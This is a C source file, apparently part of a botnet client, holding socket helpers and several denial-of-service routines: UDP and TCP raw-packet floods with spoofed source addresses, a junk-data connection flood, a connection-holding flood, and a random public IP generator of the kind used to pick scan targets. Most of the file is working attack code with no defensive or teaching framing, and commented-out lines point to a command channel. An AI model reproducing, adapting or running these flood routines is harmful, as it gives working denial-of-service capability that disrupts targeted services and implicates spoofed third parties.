/*
   created at 2015//4/9
   latest modified at 2015/4/9
   network functions used by alexjlz
 */

#include "tcpip.h"
#include "../utils/utils.h"
#include <sys/socket.h>

#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <net/if.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>


int getHost(unsigned char *toGet, struct in_addr *i)
{
    struct hostent *h;
    if((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}

unsigned char macAddress[6] = {0};
struct in_addr ourIP;
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;

    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}

static uint8_t ipState[5]; //starting from 1 becuz yolo
in_addr_t getRandomPublicIP()
{
    if(ipState[1] > 0 && ipState[4] < 255)
    {
        ipState[4]++;
        char ip[16] = {0};
        sprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
        return inet_addr(ip);
    }

    ipState[1] = rand() % 255;
    ipState[2] = rand() % 255;
    ipState[3] = rand() % 255;
    ipState[4] = 0;
    while(
            (ipState[1] == 0) ||
            (ipState[1] == 10) ||
            (ipState[1] == 100 && (ipState[2] >= 64 && ipState[2] <= 127)) ||
            (ipState[1] == 127) ||
            (ipState[1] == 169 && ipState[2] == 254) ||
            (ipState[1] == 172 && (ipState[2] <= 16 && ipState[2] <= 31)) ||
            (ipState[1] == 192 && ipState[2] == 0 && ipState[3] == 2) ||
            (ipState[1] == 192 && ipState[2] == 88 && ipState[3] == 99) ||
            (ipState[1] == 192 && ipState[2] == 168) ||
            (ipState[1] == 198 && (ipState[2] == 18 || ipState[2] == 19)) ||
            (ipState[1] == 198 && ipState[2] == 51 && ipState[3] == 100) ||
            (ipState[1] == 203 && ipState[2] == 0 && ipState[3] == 113) ||
            (ipState[1] >= 224)
         )
    {
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
    }

    char ip[16] = {0};
    sprintf(ip, "%d.%d.%d.0", ipState[1], ipState[2], ipState[3]);
    return inet_addr(ip);
}

in_addr_t getRandomIP(in_addr_t netmask)
{
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ ( rand_cmwc() & ~netmask);
}

int create_tcp_server(short port)
{
    int listen_fd = 0;
    struct sockaddr_in server_addr;

    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd == -1)
    {
        perror("socket");
        exit(-1);
    }

    bzero(&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(port);

    if (bind(listen_fd, (struct sockaddr *) &server_addr, sizeof(struct sockaddr_in)) == -1)
    {
        perror("bind");
        exit(-1);
    }

    if (listen(listen_fd, 128) == -1 )
    {
        perror("listen");
        exit(-1);
    }

    return listen_fd;
}

int connect_tcp_server(char *ip, short port)
{
    int fd = 0;
    struct sockaddr_in server_addr;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
    {
        perror("socket");
        return -1;
    }

    bzero(&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if ( inet_pton(AF_INET, ip, &(server_addr.sin_addr) ) < 0 )
    {
        perror("inet_pton");
        return -1;
    }

    if ( connect(fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0 )
    {
        perror("connect");
        return -1;
    }

    return fd;
}

    ssize_t						/* Read "n" bytes from a descriptor. */
readn(int fd, void *vptr, size_t n)  /* Return bytes read */
{
    size_t	nleft;
    ssize_t	nread;
    char	*ptr;

    ptr = vptr;
    nleft = n;
    while (nleft > 0) {
        if ( (nread = read(fd, ptr, nleft)) < 0) {
            if (errno == EINTR)
                nread = 0;		/* and call read() again */
            else
                return(-1);
        } else if (nread == 0)
            break;				/* EOF */

        nleft -= nread;
        ptr   += nread;
    }
    return(n - nleft);		/* return >= 0 */
}
/* end readn */

    ssize_t						/* Write "n" bytes to a descriptor. */
writen(int fd, const void *vptr, size_t n)
{
    size_t		nleft;
    ssize_t		nwritten;
    const char	*ptr;

    ptr = vptr;
    nleft = n;
    while (nleft > 0) {
        if ( (nwritten = write(fd, ptr, nleft)) <= 0) {
            if (nwritten < 0 && errno == EINTR)
                nwritten = 0;		/* and call write() again */
            else
                return(-1);			/* error */
        }

        nleft -= nwritten;
        ptr   += nwritten;
    }
    return(n);
}
/* end writen */

/* get remote peer ip from file descriptor
   remote_ip should be char [1024] */
int get_remote_ip(int fd, char remote_ip[])
{
    int status = 0;
    struct sockaddr client;
    socklen_t client_len = sizeof(client);

    status = getpeername(fd, &client, &client_len);
    if ( status == -1 )
    {
        alexjlz_log("Error getpeername %s\n", strerror(errno));
        return -1;
    }
    else
    {
        getnameinfo(&client, sizeof(client), remote_ip, 1023, NULL, 0, NI_NUMERICHOST | NI_NUMERICSERV);
        return 0;
    }

}

//   _____  ___         _   _ _
//   \_   \/ _ \  /\ /\| |_(_) |___
//    / /\/ /_)/ / / \ \ __| | / __|
// /\/ /_/ ___/  \ \_/ / |_| | \__ \
// \____/\/       \___/ \__|_|_|___/
unsigned short csum (unsigned short *buf, int count)
{
    register uint64_t sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}

//          ___  ___     ___ _                 _
//  /\ /\  /   \/ _ \   / __\ | ___   ___   __| |
// / / \ \/ /\ / /_)/  / _\ | |/ _ \ / _ \ / _` |
// \ \_/ / /_// ___/  / /   | | (_) | (_) | (_| |
//  \___/___,'\/      \/    |_|\___/ \___/ \__,_|

void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    register unsigned int pollRegister;
    pollRegister = pollinterval;

    if(spoofit == 32)
    {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd)
        {
            //sockprintf(mainCommSock, "Failed opening raw socket.");
            return;
        }

        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

            if(i == pollRegister)
            {
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
        }
    } else {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd)
        {
            //sockprintf(mainCommSock, "Failed opening raw socket.");
            return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
            //sockprintf(mainCommSock, "Failed setting raw headers mode.");
            return;
        }

        int counter = 50;
        while(counter--)
        {
            srand(time(NULL) ^ rand_cmwc());
            init_rand(rand());
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

        udph->len = htons(sizeof(struct udphdr) + packetsize);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;

        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( getRandomIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);

            if(i == pollRegister)
            {
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
        }
    }
}

//  _____  ___   ___     ___ _                 _
// /__   \/ __\ / _ \   / __\ | ___   ___   __| |
//   / /\/ /   / /_)/  / _\ | |/ _ \ / _ \ / _` |
//  / / / /___/ ___/  / /   | | (_) | (_) | (_| |
//  \/  \____/\/      \/    |_|\___/ \___/ \__,_|

void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd)
    {
        //sockprintf(mainCommSock, "Failed opening raw socket.");
        return;
    }

    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
    {
        //sockprintf(mainCommSock, "Failed setting raw headers mode.");
        return;
    }

    in_addr_t netmask;

    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;

    if(!strcmp(flags, "all"))
    {
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->fin = 1;
        tcph->ack = 1;
        tcph->psh = 1;
    } else {
        unsigned char *pch = strtok(flags, ",");
        while(pch)
        {
            if(!strcmp(pch,         "syn"))
            {
                tcph->syn = 1;
            } else if(!strcmp(pch,  "rst"))
            {
                tcph->rst = 1;
            } else if(!strcmp(pch,  "fin"))
            {
                tcph->fin = 1;
            } else if(!strcmp(pch,  "ack"))
            {
                tcph->ack = 1;
            } else if(!strcmp(pch,  "psh"))
            {
                tcph->psh = 1;
            } else {
                //sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
            }
            pch = strtok(NULL, ",");
        }
    }

    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);

    iph->check = csum ((unsigned short *) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while(1)
    {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        iph->saddr = htonl( getRandomIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        if(i == pollRegister)
        {
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}

//   __             __          ___ _                 _
//   \ \  /\ /\  /\ \ \/\ /\   / __\ | ___   ___   __| |
//    \ \/ / \ \/  \/ / //_/  / _\ | |/ _ \ / _ \ / _` |
// /\_/ /\ \_/ / /\  / __ \  / /   | | (_) | (_) | (_| |
// \___/  \___/\_\ \/\/  \/  \/    |_|\___/ \___/ \__,_|

void sendJUNK(unsigned char *ip, int port, int end_time)
{

	int max = getdtablesize() / 2, i;

	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	if(getHost(ip, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	struct state_t
	{
		int fd;
		uint8_t state;
	} fds[max];
	memset(fds, 0, max * (sizeof(int) + 1));

	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt, res;

	unsigned char *watwat = malloc(1024);
	memset(watwat, 0, 1024);

	int end = time(NULL) + end_time;
	while(end > time(NULL))
	{
		for(i = 0; i < max; i++)
		{
			switch(fds[i].state)
			{
			case 0:
				{
					fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
					if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
					else fds[i].state = 1;
				}
				break;

			case 1:
				{
					FD_ZERO(&myset);
					FD_SET(fds[i].fd, &myset);
					tv.tv_sec = 0;
					tv.tv_usec = 10000;
					res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
					if(res == 1)
					{
						lon = sizeof(int);
						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
						if(valopt)
						{
							close(fds[i].fd);
							fds[i].state = 0;
						} else {
							fds[i].state = 2;
						}
					} else if(res == -1)
					{
						close(fds[i].fd);
						fds[i].state = 0;
					}
				}
				break;

			case 2:
				{
					//nonblocking sweg
					makeRandomStr(watwat, 1024);
					if(send(fds[i].fd, watwat, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
					{
						close(fds[i].fd);
						fds[i].state = 0;
					}
				}
				break;
			}
		}
	}
}

//              _     _     ___ _                 _
//   /\  /\___ | | __| |   / __\ | ___   ___   __| |
//  / /_/ / _ \| |/ _` |  / _\ | |/ _ \ / _ \ / _` |
// / __  / (_) | | (_| | / /   | | (_) | (_) | (_| |
// \/ /_/ \___/|_|\__,_| \/    |_|\___/ \___/ \__,_|

void sendHOLD(unsigned char *ip, int port, int end_time)
{

	int max = getdtablesize() / 2, i;

	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	if(getHost(ip, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	struct state_t
	{
		int fd;
		uint8_t state;
	} fds[max];
	memset(fds, 0, max * (sizeof(int) + 1));

	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt, res;

	unsigned char *watwat = malloc(1024);
	memset(watwat, 0, 1024);

	int end = time(NULL) + end_time;
	while(end > time(NULL))
	{
		for(i = 0; i < max; i++)
		{
			switch(fds[i].state)
			{
			case 0:
				{
					fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
					if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
					else fds[i].state = 1;
				}
				break;

			case 1:
				{
					FD_ZERO(&myset);
					FD_SET(fds[i].fd, &myset);
					tv.tv_sec = 0;
					tv.tv_usec = 10000;
					res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
					if(res == 1)
					{
						lon = sizeof(int);
						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
						if(valopt)
						{
							close(fds[i].fd);
							fds[i].state = 0;
						} else {
							fds[i].state = 2;
						}
					} else if(res == -1)
					{
						close(fds[i].fd);
						fds[i].state = 0;
					}
				}
				break;

			case 2:
				{
					FD_ZERO(&myset);
					FD_SET(fds[i].fd, &myset);
					tv.tv_sec = 0;
					tv.tv_usec = 10000;
					res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
					if(res != 0)
					{
						close(fds[i].fd);
						fds[i].state = 0;
					}
				}
				break;
			}
		}
	}
}
